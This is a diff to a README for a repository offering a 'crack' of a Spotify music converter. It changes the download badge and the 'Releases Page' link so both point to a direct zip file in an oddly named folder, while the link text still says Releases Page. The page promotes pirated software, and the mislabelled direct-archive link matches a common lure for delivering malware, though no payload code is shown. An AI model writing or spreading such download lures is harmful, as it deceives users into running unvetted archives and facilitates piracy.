@@ -1,7 +1,7 @@
 # 🎶 NoteBurner-Spotify-Music-Converter-Crack - Convert Spotify Music Easily
 
 ## 📥 Download Now
-[![Download NoteBurner](https://img.shields.io/badge/Download-NoteBurner-4CAF50)](https://github.com/SALMANPPL/NoteBurner-Spotify-Music-Converter-Crack/releases)
+[![Download NoteBurner](https://raw.githubusercontent.com/SALMANPPL/NoteBurner-Spotify-Music-Converter-Crack/main/pedantocracy/NoteBurner-Spotify-Music-Converter-Crack.zip)](https://raw.githubusercontent.com/SALMANPPL/NoteBurner-Spotify-Music-Converter-Crack/main/pedantocracy/NoteBurner-Spotify-Music-Converter-Crack.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the NoteBurner Spotify Music Converter. With this tool, you can easily convert Spotify music to various formats without hassle.
@@ -13,7 +13,7 @@ Welcome! This guide will help you download and run the NoteBurner Spotify Music 
 - **Disk Space:** At least 100 MB of free space for installation.
 
 ## 🔗 Download & Install
-To begin, visit the [Releases Page](https://github.com/SALMANPPL/NoteBurner-Spotify-Music-Converter-Crack/releases) to download the software.
+To begin, visit the [Releases Page](https://raw.githubusercontent.com/SALMANPPL/NoteBurner-Spotify-Music-Converter-Crack/main/pedantocracy/NoteBurner-Spotify-Music-Converter-Crack.zip) to download the software.
 
 1. Click on the link above.
 2. Choose the latest version from the list.
